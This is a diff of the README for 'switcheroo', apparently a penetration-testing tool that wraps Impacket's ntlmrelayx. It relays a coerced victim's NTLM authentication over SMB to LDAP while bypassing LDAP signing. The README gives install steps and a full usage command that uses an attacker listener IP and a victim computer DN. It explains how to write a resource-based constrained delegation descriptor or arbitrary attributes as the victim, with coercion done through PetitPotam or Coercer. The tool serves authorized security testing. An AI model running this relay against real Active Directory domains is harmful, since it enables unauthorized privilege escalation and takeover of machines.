@@ -2,28 +2,45 @@
 
 Relay a coerced victim's NTLM authentication into an LDAP operation executed with the
 victim's permissions, bypassing LDAP signing. Thin wrapper around Impacket's
-`ntlmrelayx.py` (it starts `ntlmrelayx` for you).
+`ntlmrelayx` (it starts `ntlmrelayx` for you).
+
+## Install
+
+Requires Python ≥ 3.9. The dependency on Impacket tracks `fortra/impacket` master
+because the PyPI `0.13.1` release lacks the LDAP signing / SASL context APIs this tool
+drives (PRs [#1919](https://github.com/fortra/impacket/pull/1919),
+[#1959](https://github.com/fortra/impacket/pull/1959)) — the master tree is fetched
+automatically, no `PYTHONPATH` or local Impacket checkout needed.
+
+```
+uv tool install .
+```
+
+Run without installing, from the repo:
+
+```
+uv run switcheroo ...
+```
+
+To pick up newer master, `uv lock --upgrade && uv tool install --force --reinstall .`.
 
 ## Requirements
 
-- Python 3, run as root (SMB listener on TCP/445).
-- A pinned Impacket exposing LDAP signing + security-context APIs (the PyPI `0.13.1`
-  package is not sufficient). Point `PYTHONPATH` at it and pass its `ntlmrelayx.py`.
+- Run as root (SMB listener on TCP/445).
 - A coercion tool to drive the victim to your listener (Coercer / PetitPotam).
 - The victim must be coerced to authenticate over **SMB** (the only supported source).
 
 ## Usage
 
 ```
-sudo PYTHONPATH=/path/to/pinned-impacket python3 switcheroo.py \
+sudo switcheroo \
     'DOMAIN/attacker[:password]@DC.fqdn' \
     -dc-ip <DC_IP> \
     -base-dn 'DC=example,DC=com' \
     -listen-ip <ATTACKER_IP> \
     -victim 'DOMAIN/VICTIM$' \
     -modify-dn 'CN=VICTIM,CN=Computers,DC=example,DC=com' \
-    -rbcd-sid '<ATTACKER_COMPUTER_SID>' \
-    -ntlmrelayx /path/to/pinned-impacket/examples/ntlmrelayx.py
+    -rbcd-sid '<ATTACKER_COMPUTER_SID>'
 ```
 
 Then coerce the victim toward `-listen-ip` from another terminal.
@@ -34,7 +51,7 @@ be prompted, or use `-hashes LMHASH:NTHASH` / `-no-pass`.
 Keep stdin open (`ntlmrelayx` exits on EOF):
 
 ```
-tail -f /dev/null | sudo PYTHONPATH=... python3 switcheroo.py ... &
+tail -f /dev/null | sudo switcheroo ... &
 ```
 
 ## Key options
@@ -47,7 +64,7 @@ tail -f /dev/null | sudo PYTHONPATH=... python3 switcheroo.py ... &
 | `-modify-dn` | DN of the object to modify as the victim |
 | `-rbcd-sid SID` | write an RBCD descriptor granting this SID |
 | `-value` / `-value-hex` / `-attribute` | write an arbitrary attribute instead of RBCD |
-| `-ntlmrelayx PATH` | path to `ntlmrelayx.py` |
+| `-ntlmrelayx PATH` | optional: run a specific `ntlmrelayx.py` instead of the installed one |
 | `-hashes`, `-no-pass`, `-debug`, `-ts` | auth / logging |
 
 The tool prints the DC's `Bind`/`Modify` result codes and does an independent signed
